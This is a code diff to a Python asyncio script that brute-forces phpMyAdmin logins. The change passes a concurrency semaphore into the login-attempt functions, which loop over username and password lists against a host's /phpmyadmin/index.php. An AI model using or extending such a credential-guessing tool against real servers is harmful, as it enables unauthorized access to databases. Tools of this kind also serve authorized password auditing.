@@ -51,11 +51,12 @@ async def handle_request(session, url, method, data=None, **kwargs):
             return None, None
 
 
-async def phpmyadmin_crack(host, username, password):
+async def phpmyadmin_crack(host, username, password, limit):
     """phpmyadmin密码爆破"""
+    # 超时
     timeout = aiohttp.ClientTimeout(total=30)
-    async with semaphore:
-        async with aiohttp.TCPConnector(limit=20, force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
+    async with limit:
+        async with aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
             async with aiohttp.ClientSession(connector=tc, timeout=timeout, cookie_jar=jar) as session:
                 url = host + "/phpmyadmin/index.php"
                 # 第一次请求获取token
@@ -189,27 +190,27 @@ def handle_user_pass():
     user_password_loop.run_until_complete(async_handle_user_pass())
 
 
-async def async_handle_login(host):
+async def async_handle_login(host, limit):
     for username in username_list:
-        tasks = [asyncio.create_task(phpmyadmin_crack(host, username, password)) for password in password_list]
+        tasks = [asyncio.create_task(phpmyadmin_crack(host, username, password, limit)) for password in password_list]
         done, pending = await asyncio.wait(tasks)
         print(done)
 
 
-def handle_login(host):
+def handle_login(host, limit):
     # 多线程中协程Loop标记
     # new_login_loop = asyncio.new_event_loop()
     # asyncio.set_event_loop(new_login_loop)
     login_loop = asyncio.get_event_loop()
-    login_loop.run_until_complete(async_handle_login(host))
+    login_loop.run_until_complete(async_handle_login(host, limit))
 
 
-def main(host):
+def main(host, limit):
     # 处理用户名密码文件
     up = multiprocessing.Process(target=handle_user_pass)
     up.start()
     up.join()
-    login = multiprocessing.Process(target=handle_login, args=(host,))
+    login = multiprocessing.Process(target=handle_login, args=(host,limit,))
     login.start()
     login.join()
     # if login_result:
@@ -242,6 +243,6 @@ if __name__ == '__main__':
     start_timestamp, start_time = handle_time()
     print("开始扫描时间{}".format(start_time))
     # 调用主方法
-    main(host=url)
+    main(host=url, limit=semaphore)
     end_timestamp, end_time = handle_time()
     print("扫描完成时间{}, 扫描耗时:{}分钟".format(end_time, int((end_timestamp - start_timestamp) / 60)))
